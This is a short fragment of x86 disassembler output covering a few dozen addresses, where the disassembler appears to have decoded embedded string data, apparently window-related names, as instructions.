  4247ab:	add    dl,dl
  4247ad:	inc    edi
  4247ae:	add    al,BYTE PTR [eax]
  4247b0:	add    DWORD PTR [eax],eax
  4247b2:	add    BYTE PTR [eax],al
  4247b4:	add    DWORD PTR [eax],eax
  4247b6:	add    BYTE PTR [eax],al
  4247b8:	add    DWORD PTR [eax],eax
  4247ba:	add    BYTE PTR [eax],al
  4247bc:	enter  0x247,0x0
  4247c0:	int3   
  4247c1:	inc    edi
  4247c2:	add    al,BYTE PTR [eax]
  4247c4:	rol    BYTE PTR [edi+0x2],1
  4247c7:	add    ah,bl
  4247c9:	cmp    al,0x0
  4247cb:	add    dh,bl
  4247cd:	inc    edi
  4247ce:	add    al,BYTE PTR [eax]
  4247d0:	add    BYTE PTR [eax],al
  4247d2:	push   edi
  4247d3:	outs   dx,DWORD PTR ds:[esi]
  4247d4:	jb     0x42483a
  4247d6:	push   edi
  4247d7:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4247de:	aas    
  4247df:	inc    ebx
  4247e0:	ins    BYTE PTR es:[edi],dx
  4247e1:	outs   dx,DWORD PTR ds:[esi]
  4247e2:	jae    0x424849
  4247e4:	push   edi
  4247e5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4247ec:	popa   
  4247ed:	je     0x424858
  4247ef:	outs   dx,DWORD PTR ds:[esi]
  4247f0:	outs   dx,BYTE PTR ds:[esi]
  4247f1:	inc    ebx
  4247f2:	ins    BYTE PTR es:[edi],dx
  4247f3:	outs   dx,DWORD PTR ds:[esi]
  4247f4:	jae    0x42485b
  4247f6:	push   edi
  4247f7:	imul   eax,DWORD PTR [eax],0x0
  4247fd:	add    BYTE PTR [eax],al
	...
